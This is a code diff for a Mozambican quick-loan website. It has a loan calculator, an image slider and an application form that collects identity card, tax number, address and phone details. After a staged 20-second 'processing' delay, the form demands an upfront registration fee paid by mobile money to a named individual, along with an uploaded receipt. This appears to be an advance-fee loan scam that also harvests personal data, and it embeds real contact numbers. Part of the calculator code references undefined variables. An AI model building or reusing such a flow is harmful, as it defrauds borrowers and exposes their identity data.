+    function initApp(){ setContacts(); greetUser(); bindNavClicks(); const taxa=$('#taxa'); if(taxa) taxa.value=10; $('#btnCalcular').addEventListener('click', calcular); $('#btnLimpar').addEventListener('click', ()=>{ ['valor','prazo','taxa','comissao','seguro'].forEach(id=>{ const el=$('#'+id); if(el) el.value = el.defaultValue || ''; }); calcular(); }); calcular(); setupForm(); initHeroSlider(); }
+
+function calcular() {
+  const pv = Number($('#valor').value || 0);
+  let n = Number($('#prazo').value || 0);
+  const i = Number($('#taxa').value || 0) / 100;
+
+  const periodicidade = $('#periodicidade').value; // novo
+  let periodoLabel = '';
+  let taxaLabel = '';
+
+  // Ajusta prazo e etiqueta de acordo com periodicidade
+  if (periodicidade === 'diario') {
+    periodoLabel = `${n} dias`;
+    taxaLabel = `Taxa ${($('#taxa').value||'0')}% a.d.`;
+  } else if (periodicidade === 'semanal') {
+    periodoLabel = `${n} semanas`;
+    taxaLabel = `Taxa ${($('#taxa').value||'0')}% a.s.`;
+  } else {
+    periodoLabel = `${n} meses`;
+    taxaLabel = `Taxa ${($('#taxa').value||'0')}% a.m.`;
+  }
+
+  $('#simuTag').textContent = taxaLabel;
+  $('#etiquetaPrazo').textContent = periodoLabel;
+
+  const taxaRef = $('#taxaRef');
+  if(taxaRef) taxaRef.textContent = `a partir de ${($('#taxa').value||'0')}%`;
+
+  if(pv <= 0 || n <= 0){
+    ['parcela','total','cet'].forEach(id => $('#'+id).textContent='–');
+    return;
+  }
+
+  // Cálculo da parcela (PRICE) adaptado
+  const parcela = i > 0 ? (pv * i) / (1 - Math.pow(1 + i, -n)) : pv / n;
+
+  $('#parcela').textContent = fmtMZN(parcela);
+  $('#total').textContent = fmtMZN(total);
+  $('#cet').textContent = `${isFinite(cet)?cet.toFixed(1):'0.0'}%`;
+}
+
+    /* ==========================
+       HERO SLIDER (imagens + textos)
+    =========================== */
+    function initHeroSlider(){
+      const wrap = document.getElementById('heroSlides');
+      const dotsWrap = document.getElementById('heroDots');
+      const slider = document.getElementById('heroSlider');
+      if(!wrap || !dotsWrap || !slider) return;
+
+      // Montar slides a partir do CONFIG.SLIDES
+      wrap.innerHTML = ''; dotsWrap.innerHTML = '';
+      (CONFIG.SLIDES||[]).forEach((s, i)=>{
+        const slide = document.createElement('div'); slide.className='slide';
+        const img = new Image(); img.src = s.url; img.alt = s.titulo || `Slide ${i+1}`;
+        const cap = document.createElement('div'); cap.className='caption';
+        cap.innerHTML = `<b>${s.titulo||''}</b><div class="hint">${s.texto||''}</div>`;
+        slide.appendChild(img); slide.appendChild(cap); wrap.appendChild(slide);
+
+        const dot = document.createElement('button'); dot.className='dot'; dot.setAttribute('aria-label',`Ir para slide ${i+1}`); dot.addEventListener('click',()=>goTo(i)); dotsWrap.appendChild(dot);
+      });
+
+      let idx = 0, N = (CONFIG.SLIDES||[]).length, auto = null;
+      function goTo(i){ if(!N) return; idx = (i+N)%N; wrap.style.transform = `translateX(-${idx*100}%)`; [...dotsWrap.children].forEach((d,k)=>d.classList.toggle('active', k===idx)); }
+      function next(){ goTo(idx+1); }
+      function prev(){ goTo(idx-1); }
+      function start(){ stop(); auto = setInterval(next, 4000); }
+      function stop(){ if(auto){ clearInterval(auto); auto=null; } }
+
+      slider.querySelector('.next').addEventListener('click', next);
+      slider.querySelector('.prev').addEventListener('click', prev);
+      slider.addEventListener('mouseenter', stop);
+      slider.addEventListener('mouseleave', start);
+
+      goTo(0); start();
+
+      // Expor para debug (opcional)
+      window.HeroSlider = { next, prev, goTo, start, stop };
+    }
+
+    /* ==========================
+       FORM + TAXA FLOW
+    =========================== */
+    let taxaTimer = null, taxaSeconds = 60;
+
+    function setupForm(){
+      const form = $('#loanForm');
+      const toast = $('#toast');
+      const limiteAviso = $('#limiteAviso');
+      const valorInput = $('#valorSolicitado');
+      valorInput.addEventListener('input', ()=>{ const v=Number(valorInput.value||0); limiteAviso.style.display = v>CONFIG.VALOR_MAX ? 'block' : 'none'; });
+
+      function showToast(msg){ toast.textContent = msg; toast.style.display='block'; setTimeout(()=>toast.style.display='none', 3500); }
+
+      form.addEventListener('submit', async (e)=>{
+        e.preventDefault();
+        const required = ['nome','bi','nuit','telefone','valorSolicitado','consent'];
+        for(const id of required){ const el=document.getElementById(id); if(el && ((el.type==='checkbox' && !el.checked) || (el.value||'').trim()==='')){ el.focus(); showToast('Preencha todos os campos obrigatórios e aceite os termos.'); return; } }
+        if(Number(valorInput.value||0) > CONFIG.VALOR_MAX){ showToast(`Aviso: valor máximo é ${CONFIG.VALOR_MAX.toLocaleString('pt-MZ')} MZN.`); }
+        await startProcessing(); // 20s
+        openTaxaModal();
+      });
+    }
+
+    async function startProcessing(){
+      const overlay = $('#processing');
+      overlay.style.display='flex';
+      await waitMs(20000); // 20s
+      overlay.style.display='none';
+    }
+
+    function waitMs(n){ return new Promise(res=>setTimeout(res,n)); }
+
+    function openTaxaModal(){
+      $('#taxaModal').style.display='flex';
+      const btnConfirm = $('#btnConfirmarPagamento');
+      const countdown = $('#countdown');
+      const comprovativo = $('#comprovativo');
+      const ref = $('#refPagamento');
+      btnConfirm.disabled = true;
+      taxaSeconds = 60;
+      countdown.textContent = `Confirmação disponível em ${taxaSeconds}s…`;
+      if(taxaTimer) clearInterval(taxaTimer);
+      taxaTimer = setInterval(()=>{
+        taxaSeconds--; countdown.textContent = `Confirmação disponível em ${taxaSeconds}s…`;
+        if(taxaSeconds<=0){ clearInterval(taxaTimer); countdown.textContent = 'Pode confirmar o pagamento.'; maybeEnableConfirm(); }
+      },1000);
+
+      function maybeEnableConfirm(){ btnConfirm.disabled = !(comprovativo.files && comprovativo.files.length>0 && (ref.value||'').trim()!=='' && taxaSeconds<=0); }
+      comprovativo.addEventListener('change', maybeEnableConfirm);
+      ref.addEventListener('input', maybeEnableConfirm);
+
+      $('#btnFecharTaxa').onclick = ()=>{ $('#taxaModal').style.display='none'; };
+      btnConfirm.onclick = async ()=>{
+        if(btnConfirm.disabled) return;
+        try{ await sendLeadWithPaymentMeta(); }catch(e){ console.warn('Falha ao enviar metadados (simulado)', e); }
+        $('#taxaModal').style.display='none';
+        $('#reviewModal').style.display='flex';
+      };
+    }
+
+    async function sendLeadWithPaymentMeta(){
+      const payload = buildPayload();
+      payload.pagamento = {
+        taxa: CONFIG.TAXA_INSCRICAO,
+        mpesa: { numero: CONFIG.MPESA_NUMBER, nome: CONFIG.MPESA_NAME },
+        emola: { numero: CONFIG.EMOLA_NUMBER, nome: CONFIG.EMOLA_NAME },
+        ref: $('#refPagamento').value.trim(),
+        comprovativo_nome: ($('#comprovativo').files[0]||{}).name || null,
+        ts_confirmacao: new Date().toISOString()
+      };
+      if(CONFIG.SUBMIT_MODE==='email') return sendEmail(payload);
+      if(CONFIG.SUBMIT_MODE==='sheets') return sendSheets(payload);
+      return sendAPI(payload);
+    }
+
+    function buildPayload(){
+      return {
+        nome: $('#nome').value.trim(),
+        bi: $('#bi').value.trim(),
+        nuit: $('#nuit').value.trim(),
+        telefone: $('#telefone').value.trim(),
+        email: $('#email').value.trim(),
+        endereco: $('#endereco').value.trim(),
+        numCasa: $('#numCasa').value.trim(),
+        quarteirao: $('#quarteirao').value.trim(),
+        bairro: $('#bairro').value.trim(),
+        cidade: $('#cidade').value,
+        valor: Number($('#valorSolicitado').value||0),
+        prazo: $('#prazoSolicitado').value,
+        plano: $('#plano').value,
+        finalidade: $('#finalidade').value,
+        ts: new Date().toISOString(),
+        origem: location.href
+      };
+    }
+
+    async function sendEmail(payload){
+      const body = encodeURIComponent(
+        `Nova solicitação de empréstimo:%0D%0A`+
+        `Nome: ${payload.nome}%0D%0A`+
+        `BI: ${payload.bi}%0D%0A`+
+        `Telefone: ${payload.telefone}%0D%0A`+
+        `Email: ${payload.email}%0D%0A`+
+        `Endereço: ${payload.endereco}, Casa ${payload.numCasa}, Qd ${payload.quarteirao}, Bairro ${payload.bairro}, ${payload.cidade}%0D%0A`+
+        `Valor: ${payload.valor} MZN%0D%0A`+
+        `Prazo: ${payload.prazo} meses • Plano: ${payload.plano}%0D%0A`+
+        `Finalidade: ${payload.finalidade}%0D%0A`+
+        `Pagamento: Taxa ${CONFIG.TAXA_INSCRICAO} MT, Ref ${payload.pagamento?.ref || '-'}%0D%0A`
+      );
+      window.location.href = `mailto:${CONFIG.CONTACT_EMAIL}?subject=Nova solicitação de empréstimo&body=${body}`;
+      return {ok:true, via:'mailto'};
+    }
+    async function sendSheets(payload){ const res = await fetch(CONFIG.SHEETS_WEBAPP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}); if(!res.ok) throw new Error('Sheets falhou'); return await res.json().catch(()=>({ok:true, via:'sheets'})); }
+    async function sendAPI(payload){ const res = await fetch(CONFIG.API_ENDPOINT,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}); if(!res.ok) throw new Error('API falhou'); return await res.json().catch(()=>({ok:true, via:'api'})); }
+
+    // Review modal OK
+    $('#btnOkReview').addEventListener('click', ()=>{ $('#reviewModal').style.display='none'; route(); window.scrollTo({top:0,behavior:'smooth'}); });
+  </script>
+
+  <!-- ========= UPGRADE LAYER (Patch opcional; se der fluxo duplo, comenta este bloco) ========= -->
+  <script>
+  (function(){
+    const CFG = (window.CONFIG)||{
+      WHATSAPP_NUMBER: '258878128663', CONTACT_EMAIL: 'Emprestimorapido@gmail.com',
+      SUBMIT_MODE: 'sheets', SHEETS_WEBAPP_URL: 'https://script.google.com/macros/s/FAKE_SHEET_URL/exec',
+      EMOLA_NUMBER: '878128663', EMOLA_NAME:'Artesia Armando',
+      TAXA_INSCRICAO: 20, VALOR_MAX: 10000
+    };
+    const $ = (s,sc=document) => sc.querySelector(s);
+    const on = (el,ev,fn) => el && el.addEventListener(ev,fn);
+
+    const form = $('#loanForm') || $('form[data-loan]') || $('form');
+    if(!form) return;
+
+    (function ensureCSS(){
+      if($('#upgrade-css')) return;
+      const st = document.createElement('style'); st.id='upgrade-css';
+      st.textContent = `
+        .overlay{position:fixed;inset:0;background:rgba(2,8,23,.65);display:none;align-items:center;justify-content:center;padding:16px;z-index:9999}
+        .modal{max-width:620px;width:100%;background:#0f172a;border:1px solid rgba(148,163,184,.2);border-radius:16px;box-shadow:0 10px 30px rgba(2,8,23,.45);color:#e5e7eb}
+        .pad{padding:18px}
+        .spinner{width:42px;height:42px;border-radius:999px;border:3px solid rgba(148,163,184,.2);border-top-color:#22d3ee;animation:spin 1s linear infinite;margin:0 auto}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 16px;border-radius:12px;border:1px solid rgba(148,163,184,.18);background:#0b1327;color:#e5e7eb;font-weight:700;cursor:pointer}
+        .btn-primary{background:#16a34a;color:#071427;font-weight:800;border-radius:12px}
+        .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+        @media(max-width:700px){.row{grid-template-columns:1fr}}
+        .warn{background:#1a2236;border:1px solid rgba(255,193,7,.35);color:#fde68a;padding:10px 12px;border-radius:10px;margin-top:8px}
+        .kv{display:grid;grid-template-columns:1fr auto;gap:8px;font-size:14px}
+        .divider{height:1px;background:linear-gradient(90deg,transparent,rgba(148,163,184,.3),transparent);margin:12px 0}
+      `; document.head.appendChild(st);
+    })();
+
+    function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
+    async function startProcessing(){ const overlay=$('#processing'); if(!overlay) return; overlay.style.display='flex'; await wait(20000); overlay.style.display='none'; }
+    function openTaxaModal(){
+      const modal = $('#taxaModal'); const btnConfirm = $('#btnConfirmarPagamento'); const countdown = $('#countdown');
+      const comprovativo = $('#comprovativo'); const ref = $('#refPagamento');
+      if(!modal) return;
+      btnConfirm.disabled = true; modal.style.display='flex';
+      let sec = 90; 
+      const timer = setInterval(()=>{ sec--;  if(sec<=0){ clearInterval(timer); countdown.textContent = 'Pode confirmar o pagamento.'; maybeEnable(); } },1000);
+      function maybeEnable(){ btnConfirm.disabled = !(comprovativo.files?.length>0 && (ref.value||'').trim()!=='' && sec<=0); }
+      on(comprovativo,'change', maybeEnable); on(ref,'input', maybeEnable);
+      on($('#btnFecharTaxa'),'click', ()=>{ modal.style.display='none'; });
+      on(btnConfirm,'click', async ()=>{ if(btnConfirm.disabled) return; modal.style.display='none'; try{ /* opcional: enviar */ }catch(e){} $('#reviewModal').style.display='flex'; });
+    }
+    on(form,'submit', async (e)=>{ e.preventDefault(); await startProcessing(); openTaxaModal(); });
+    on(document,'click', (ev)=>{ if(ev.target && ev.target.id==='btnOkReview'){ $('#reviewModal').style.display='none'; window.scrollTo({top:0,behavior:'smooth'}); }});
+  })();
+  </script>
+  <footer style="background:#222; color:#fff; text-align:center; padding:20px; margin-top:40px;">
+  <p><strong>Localização:</strong> chiango,Maputo.1222 - Moçambique</p>
+  <p><strong>Contactos:</strong> 
+    WhatsApp: <a href="https://wa.me/258878128663" style="color:#0f0;">+258 878128663</a> | 
+    Email: <a href="mailto:emprestimorapido@gmail.com" style="color:#0f0;">Emprestimo@Gmail.com</a>
+  </p>
+
+  <!-- Redes sociais -->
+  <div style="margin-top:10px;">
+    <a href="https://facebook.com/seupagina" target="_blank" style="color:#3b5998; margin:0 10px; font-size:22px;">
+      <i class="fab fa-facebook"></i>
+    </a>
+    <a href="https://wa.me/258878128663" target="_blank" style="color:#25D366; margin:0 10px; font-size:22px;">
+      <i class="fab fa-whatsapp"></i>
+    </a>
+    <a href="https://instagram.com/seuperfil" target="_blank" style="color:#E1306C; margin:0 10px; font-size:22px;">
+      <i class="fab fa-instagram"></i>
+    </a>
+  </div>
+
+  <p style="margin-top:10px;">&copy; 2025 Todos os direitos reservados</p>
+</footer>
+  <!-- ========= /UPGRADE LAYER ========= -->
+</body>
+</html>
